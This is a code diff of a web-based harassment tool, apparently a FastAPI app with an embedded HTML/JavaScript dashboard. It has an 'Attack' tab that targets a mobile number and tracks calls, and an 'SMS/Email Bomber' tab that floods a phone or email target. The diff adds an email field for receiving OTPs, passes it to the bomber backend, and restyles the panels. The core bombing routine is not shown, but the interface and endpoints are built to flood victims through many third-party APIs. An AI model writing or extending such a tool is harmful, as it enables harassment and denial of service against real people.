src="data:audio/wav;base64,UklGRsYDAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQYDAACBhYqFh4qAgICAf4mMjo6LgH6Af3t/gHp3doR/gXx2e3Z1c2dxc3NwZWNfXmNcU1hVU1dWU1BQUU1MSkVGRkpHSEZGQ0dDQkI+OjUyMy4rKScnJiMiHRsWGRIPDAkGBwMCAQABAgIDAwMCAgEBAQEBAQEBAgIDAgIDAgIDAwMDAwMEBAQEBQUFBQUGBgYGBwcHCAgJCQkJCwsLCwsLCwwMDA0NDQ4ODg8PDw8PDw8PDw8PDw8PDw8QDw8PDw4ODg0NDQwMDAwLCwsKCgoICQgHBwYGBgUEBAMDAwICAQEBAQEBAQEBAQECAgIDAwMDAwQEBAUFBQYGBwcHCAgICQkJCgoLCwwMDA0ODQ4PDw8PDxAPEA8PDw8PDw8PDw8OEA8PDw4ODg4ODQ0NDQwMDAwLCwsLCgoKCQkJCQgHBwYGBgUFBAMDAwMCAgIBAQEBAQECAgIDAwMDAwQEBAUFBQYGBwcHCAgICQkJCgoLCwwMDA0ODQ4PDw8PDw8QDw8PDw8PDw8PDw4ODg4ODQ0NDQwMDAwLCwsLCgoJCQkICAcHBwYGBQUEBAMDAwMCAgEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBwcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PEA8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAA==">
+        <source src="data:audio/wav;base64,UklGRsYDAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQYDAACBhYqFh4qAgICAf4mMjo6LgH6Af3t/gHp3doR/gXx2e3Z1c2dxc3NwZWNfXmNcU1hVU1dWU1BQUU1MSkVGRkpHSEZGQ0dDQkI+OjUyMy4rKScnJiMiHRsWGRIPDAkGBwMCAQABAgIDAwMCAgEBAQEBAQEBAgIDAgIDAgIDAwMDAwMEBAQEBQUFBQUGBgYGBwcHCAgJCQkJCwsLCwsLCwwMDA0NDQ4ODg8PDw8PDw8PDw8PDw8PDw8QDw8PDw4ODg0NDQwMDAwLCwsKCgoICQgHBwYGBgUEBAMDAwICAQEBAQEBAQEBAQECAgIDAwMDAwQEBAUFBQYGBwcHCAgICQkJCgoLCwwMDA0ODQ4PDw8PDxAPEA8PDw8PDw8PDw8OEA8PDw4ODg4ODQ0NDQwMDAwLCwsLCgoKCQkJCQgHBwYGBgUFBAMDAwMCAgIBAQEBAQECAgIDAwMDAwQEBAUFBQYGBwcHCAgICQkJCgoLCwwMDA0ODQ4PDw8PDw8QDw8PDw8PDw8PDw4ODg4ODQ0NDQwMDAwLCwsLCgoJCQkICAcHBwYGBQUEBAMDAwMCAgEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBwcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PEA8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAA==">
         </source>
     </audio>
 
@@ -645,10 +771,14 @@ async def index():
 
         <div class="divider-premium w-full mb-6"></div>
 
-        <!-- Tabs -->
+        <!-- Tabs with Bold Headers -->
         <div class="flex gap-1 mb-6 border-b border-white/5">
-            <button class="tab-btn active" data-tab="attack" onclick="switchTab('attack')">🚀 Attack</button>
-            <button class="tab-btn" data-tab="bomber" onclick="switchTab('bomber')">💣 SMS/Email Bomber</button>
+            <button class="tab-btn active" data-tab="attack" onclick="switchTab('attack')">
+                <span class="text-blue-400 font-bold">🚀</span> ATTACK
+            </button>
+            <button class="tab-btn" data-tab="bomber" onclick="switchTab('bomber')">
+                <span class="text-green-400 font-bold">💣</span> SMS/EMAIL BOMBER
+            </button>
         </div>
 
         <!-- Tab 1: Attack -->
@@ -656,10 +786,8 @@ async def index():
             <div class="grid grid-cols-1 lg:grid-cols-12 gap-6">
                 <!-- Control Panel -->
                 <div class="lg:col-span-5 glass-premium rounded-2xl p-6">
-                    <h2 class="text-sm font-semibold text-blue-400 tracking-wider flex items-center gap-2 mb-5">
-                        <span>🎯</span> Target Lock
-                    </h2>
-                    <div class="space-y-4">
+                    <div class="col-header col-header-blue">🎯 Target Lock</div>
+                    <div class="space-y-4 mt-4">
                         <div>
                             <label class="text-xs text-gray-500 font-medium block mb-1.5 tracking-wider">Mobile Number</label>
                             <div class="relative">
@@ -721,13 +849,11 @@ async def index():
 
                 <!-- Stats -->
                 <div class="lg:col-span-7 glass-premium rounded-2xl p-6">
-                    <div class="flex justify-between items-center mb-5">
-                        <h2 class="text-sm font-semibold text-yellow-400 tracking-wider flex items-center gap-2">
-                            <span>📊</span> Live Metrics
-                        </h2>
+                    <div class="col-header col-header-gold">📊 Live Metrics</div>
+                    <div class="flex justify-between items-center mt-2">
                         <span class="text-xs text-gray-500 font-mono" id="cycleDisplay">Cycles: 0</span>
                     </div>
-                    <div class="grid grid-cols-3 gap-3">
+                    <div class="grid grid-cols-3 gap-3 mt-3">
                         <div class="stat-premium">
                             <div class="stat-number" id="calls">0</div>
                             <div class="text-[10px] text-gray-500 uppercase tracking-wider mt-1">📞 Calls</div>
@@ -762,10 +888,8 @@ async def index():
 
                 <!-- Logs -->
                 <div class="lg:col-span-12 glass-premium rounded-2xl p-6">
-                    <div class="flex justify-between items-center mb-3">
-                        <h3 class="text-sm font-semibold text-blue-400 tracking-wider flex items-center gap-2">
-                            <span>📜</span> Attack Log
-                        </h3>
+                    <div class="col-header col-header-purple">📜 Attack Log</div>
+                    <div class="flex justify-end items-center mb-2">
                         <span class="text-[10px] text-gray-500 font-mono">Live Feed</span>
                     </div>
                     <div id="attackLogs" class="logs-premium bg-black/30 rounded-xl p-3 border border-white/5"></div>
@@ -778,20 +902,26 @@ async def index():
             <div class="grid grid-cols-1 lg:grid-cols-12 gap-6">
                 <!-- Control Panel -->
                 <div class="lg:col-span-5 glass-premium rounded-2xl p-6">
-                    <h2 class="text-sm font-semibold text-green-400 tracking-wider flex items-center gap-2 mb-5">
-                        <span>💣</span> SMS/Email Bomber
-                    </h2>
-                    <div class="space-y-4">
+                    <div class="col-header col-header-green">💣 SMS/Email Bomber</div>
+                    <div class="space-y-4 mt-4">
                         <div>
                             <label class="text-xs text-gray-500 font-medium block mb-1.5 tracking-wider">🎯 Target</label>
                             <input id="bombTarget" class="input-premium" placeholder="+923001234567 or email@example.com">
                         </div>
                         <div>
                             <label class="text-xs text-gray-500 font-medium block mb-1.5 tracking-wider">📱 Method</label>
-                            <select id="bombMethod" class="select-premium">
+                            <select id="bombMethod" class="select-premium" onchange="toggleEmailField()">
                                 <option value="phone">📱 SMS (Phone Number)</option>
                                 <option value="email">✉️ Email</option>
                             </select>
+                        </div>
+                        <div id="emailField" style="display:none;">
+                            <label class="text-xs text-gray-500 font-medium block mb-1.5 tracking-wider">✉️ Your Email (for receiving OTPs)</label>
+                            <input id="bombEmail" class="input-premium" placeholder="your@email.com">
+                            <p class="text-[10px] text-yellow-400/60 mt-1">
+                                ⚠️ Check your email inbox and <strong class="text-yellow-400">SPAM FOLDER</strong> — 
+                                OTP emails will arrive there!
+                            </p>
                         </div>
                         <div>
                             <label class="text-xs text-gray-500 font-medium block mb-1.5 tracking-wider">🔁 Amount</label>
@@ -834,21 +964,19 @@ async def index():
                                 <div class="progress-fill-green" id="bombProgress" style="width:0%"></div>
                             </div>
                         </div>
-                        <div class="text-xs text-center text-gray-500">
-                            <span id="bombStatus">Ready</span>
+                        <div class="text-xs text-center">
+                            <span id="bombStatus" class="text-gray-500">Ready</span>
                         </div>
                     </div>
                 </div>
 
                 <!-- Stats -->
                 <div class="lg:col-span-7 glass-premium rounded-2xl p-6">
-                    <div class="flex justify-between items-center mb-5">
-                        <h2 class="text-sm font-semibold text-green-400 tracking-wider flex items-center gap-2">
-                            <span>📊</span> Bomb Stats
-                        </h2>
+                    <div class="col-header col-header-gold">📊 Bomb Stats</div>
+                    <div class="flex justify-between items-center mt-2">
                         <span class="text-xs text-gray-500 font-mono" id="bombMethodDisplay">Method: SMS</span>
                     </div>
-                    <div class="grid grid-cols-3 gap-3">
+                    <div class="grid grid-cols-3 gap-3 mt-3">
                         <div class="stat-premium">
                             <div class="stat-number" id="bombStatTotal">0</div>
                             <div class="text-[10px] text-gray-500 uppercase tracking-wider mt-1">📤 Total Sent</div>
@@ -863,17 +991,19 @@ async def index():
                         </div>
                     </div>
                     <div class="mt-4 p-3 bg-black/30 rounded-xl border border-white/5">
-                        <div class="text-xs text-gray-500">Target</div>
-                        <div class="text-sm font-mono text-green-400" id="bombTargetDisplay">—</div>
+                        <div class="text-[10px] text-gray-500 uppercase tracking-wider">Target</div>
+                        <div class="text-sm font-mono text-green-400 font-bold" id="bombTargetDisplay">—</div>
+                    </div>
+                    <div class="mt-3 p-3 bg-black/30 rounded-xl border border-white/5">
+                        <div class="text-[10px] text-gray-500 uppercase tracking-wider">Email (for OTPs)</div>
+                        <div class="text-sm font-mono text-yellow-400 font-bold" id="bombEmailDisplay">—</div>
                     </div>
                 </div>
 
                 <!-- Logs -->
                 <div class="lg:col-span-12 glass-premium rounded-2xl p-6">
-                    <div class="flex justify-between items-center mb-3">
-                        <h3 class="text-sm font-semibold text-green-400 tracking-wider flex items-center gap-2">
-                            <span>📜</span> Bomb Log
-                        </h3>
+                    <div class="col-header col-header-purple">📜 Bomb Log</div>
+                    <div class="flex justify-end items-center mb-2">
                         <span class="text-[10px] text-gray-500 font-mono">Live Feed</span>
                     </div>
                     <div id="bombLogs" class="logs-premium bg-black/30 rounded-xl p-3 border border-white/5"></div>
@@ -910,6 +1040,17 @@ async def index():
             document.querySelectorAll('.tab-btn').forEach(el => el.classList.remove('active'));
             document.getElementById('tab-' + tab).classList.add('active');
             document.querySelector(`[data-tab="${tab}"]`).classList.add('active');
+        }
+
+        // ===== TOGGLE EMAIL FIELD =====
+        function toggleEmailField() {
+            const method = document.getElementById('bombMethod').value;
+            const emailField = document.getElementById('emailField');
+            if (method === 'email') {
+                emailField.style.display = 'block';
+            } else {
+                emailField.style.display = 'none';
+            }
         }
 
         // ===== THEME TOGGLE =====
@@ -982,7 +1123,7 @@ async def index():
             overlay.classList.add('active');
             setTimeout(() => {
                 overlay.classList.remove('active');
-            }, 3000);
+            }, 3500);
         }
 
         // ===== EXPORT =====
@@ -1148,6 +1289,7 @@ async def index():
         async function startBomb() {
             const target = document.getElementById('bombTarget').value.trim();
             const method = document.getElementById('bombMethod').value;
+            const email = document.getElementById('bombEmail').value.trim();
             const count = parseInt(document.getElementById('bombCount').value) || 10;
             const delay = parseFloat(document.getElementById('bombDelay').value) || 1;
 
@@ -1161,6 +1303,16 @@ async def index():
                 return;
             }
 
+            if (method === 'email' && !email) {
+                alert('❌ Please enter your email address to receive OTPs');
+                return;
+            }
+
+            if (method === 'email' && !email.match(/^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/)) {
+                alert('❌ Please enter a valid email address');
+                return;
+            }
+
             document.getElementById('bombStartBtn').classList.add('hidden');
             document.getElementById('bombStopBtn').classList.remove('hidden');
             document.getElementById('bombStatus').textContent = '⏳ Running...';
@@ -1168,12 +1320,13 @@ async def index():
 
             document.getElementById('bombMethodDisplay').textContent = `Method: ${method === 'phone' ? '📱 SMS' : '✉️ Email'}`;
             document.getElementById('bombTargetDisplay').textContent = target;
+            document.getElementById('bombEmailDisplay').textContent = method === 'email' ? email : '—';
 
             try {
                 const res = await fetch('/bomb/start', {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({target, count, delay, method})
+                    body: JSON.stringify({target, count, delay, method, email})
                 });
                 const data = await res.json();
                 if (data.status === 'success') {
@@ -1224,7 +1377,6 @@ async def index():
                         if (bombInterval) clearInterval(bombInterval);
                     }
 
-                    // Update logs
                     const logsDiv = document.getElementById('bombLogs');
                     if (d.logs && d.logs.length) {
                         logsDiv.innerHTML = d.logs.map(l => `<div class="log-entry">${l}</div>`).join('');
@@ -1249,6 +1401,7 @@ async def index():
             document.getElementById('apiCountFooter').textContent = '⚡ ' + API_COUNT + ' APIs';
             document.getElementById('attackLogs').innerHTML = '<div class="text-gray-500 text-center py-6">🟢 System initialized · Ready for action</div>';
             document.getElementById('bombLogs').innerHTML = '<div class="text-gray-500 text-center py-6">🟢 Bomber ready</div>';
+            toggleEmailField();
         });
     </script>
 </body>
@@ -1294,11 +1447,12 @@ async def bomb_start(request: Request):
         count = body.get('count', 10)
         delay = body.get('delay', 1)
         method = body.get('method', 'phone')
+        email = body.get('email', '')
         
         if bomb_status["running"]:
             return {"status": "error", "message": "Bombing already running"}
         
-        threading.Thread(target=lambda: asyncio.run(run_bomber(target, count, delay, method)), daemon=True).start()
+        threading.Thread(target=lambda: asyncio.run(run_bomber(target, count, delay, method, email)), daemon=True).start()
         return {"status": "success"}
     except Exception as e:
         return {"status": "error", "message": str(e)}
@@ -1318,6 +1472,7 @@ async def bomb_status_endpoint():
         "failed": bomb_status["failed"],
         "progress": bomb_status["progress"],
         "method": bomb_status["method"],
+        "email": bomb_status["email"],
         "logs": bomb_status["logs"][:50]
     }
 
